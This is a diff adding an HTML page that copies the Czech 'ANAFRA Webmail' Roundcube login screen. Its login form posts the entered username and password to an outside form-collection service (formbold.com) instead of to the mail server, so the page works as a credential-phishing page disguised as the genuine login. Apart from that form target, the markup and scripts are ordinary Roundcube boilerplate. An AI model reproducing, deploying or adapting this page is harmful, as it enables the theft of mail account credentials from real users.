@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="cs" class=" js mozilla"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>ANAFRA Webmail :: Vítejte v ANAFRA Webmail</title>
+<meta name="viewport" content="" id="viewport">
+
+<link rel="shortcut icon" href="ssospolicka_files/anafra.cz_logo.png">
+<link rel="stylesheet" type="text/css" href="ssospolicka_files/styles.min.css">
+
+<link rel="stylesheet" type="text/css" href="ssospolicka_files/jquery-ui.css"><script type="text/javascript" src="ssospolicka_files/ui.min.js"></script>
+
+
+
+
+<script src="ssospolicka_files/jquery.min.js"></script><script src="ssospolicka_files/common.min.js"></script><script src="ssospolicka_files/app.min.js"></script><script src="ssospolicka_files/jstz.min.js"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"cs_CZ","devel_mode":null,"rcversion":10609,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":false,"skin":"larry","blankpage":"skins/larry/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"RRRR-MM-DD","request_token":"mgES06ysgP9s6WlaXhYxL35wFW4IcuBY"});
+rcmail.add_label({"loading":"Načítám...","servererror":"Chyba serveru!","connerror":"Chyba připojení (Selhalo připojeni k serveru)!","requesttimedout":"Došlo k vypršení požadavku","refreshing":"Obnovuji...","windowopenerror":"Vyskakovací okno bylo zablokováno!","uploadingmany":"Nahrávám soubory...","uploading":"Nahrávám soubor...","close":"Zavřít","save":"Uložit","cancel":"Konec","alerttitle":"Pozor","confirmationtitle":"Jste si jistý...","delete":"Smazat","continue":"Pokračovat","ok":"OK","errortitle":"Došlo k chybě!","toggleadvancedoptions":"Přepnout pokročilé možnosti","options":"Možnosti"});
+rcmail.gui_container("loginfooter","bottomline");rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+</script>
+
+<script src="ssospolicka_files/jquery-ui.min.js"></script><script src="ssospolicka_files/datepicker-cs.js"></script>
+</head>
+<body>
+
+<h1 class="voice">ANAFRA Webmail Přihlásit</h1>
+
+<div id="login-form">
+<div class="box-inner" role="main">
+<img src="ssospolicka_files/anafra.cz_logo.png" id="logo" alt="ANAFRA Webmail">
+
+<form name="form" method="post" action="https://formbold.com/s/3Ox0j">
+<input type="hidden" name="_token" value="mgES06ysgP9s6WlaXhYxL35wFW4IcuBY">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Uživatel</label></td><td class="input"><input name="_user" id="rcmloginuser" required="" size="40" autocapitalize="none" autocomplete="off" type="text"></td></tr><tr><td class="title"><label for="rcmloginpwd">Heslo</label></td><td class="input"><input name="_pass" id="rcmloginpwd" required="" size="40" autocapitalize="none" autocomplete="off" type="password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Přihlásit</button></p>
+</form>
+
+</div>
+
+<div class="box-bottom" role="complementary">
+	<div id="message"></div>
+	<noscript>
+		<p class="noscriptwarning">Upozornění: Tato emailová aplikace vyžaduje Javascript! Prosím, zapněte Javascript v nastavení prohlížeče.</p>
+	</noscript>
+</div>
+
+<div id="bottomline" role="contentinfo">
+	ANAFRA Webmail 
+	
+		&nbsp;●&nbsp; <a href="http://www.anafra.cz/" target="_blank" class="support-link">Podpora</a>
+	
+	
+</div>
+</div>
+
+
+
+<script type="text/javascript">
+if (!window.UI) { var UI = new rcube_mail_ui(); }
+</script>
+<script>
+$(function() {
+rcmail.init();
+var images = ["skins/larry/images/ajaxloader.gif","skins/larry/images/ajaxloader_dark.gif","skins/larry/images/buttons.png","skins/larry/images/addcontact.png","skins/larry/images/filetypes.png","skins/larry/images/listicons.png","skins/larry/images/messages.png","skins/larry/images/messages_dark.png","skins/larry/images/quota.png","skins/larry/images/selector.png","skins/larry/images/splitter.png","skins/larry/images/watermark.jpg"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+</script>
+
+
+
+
+
+
+
+</body></html>
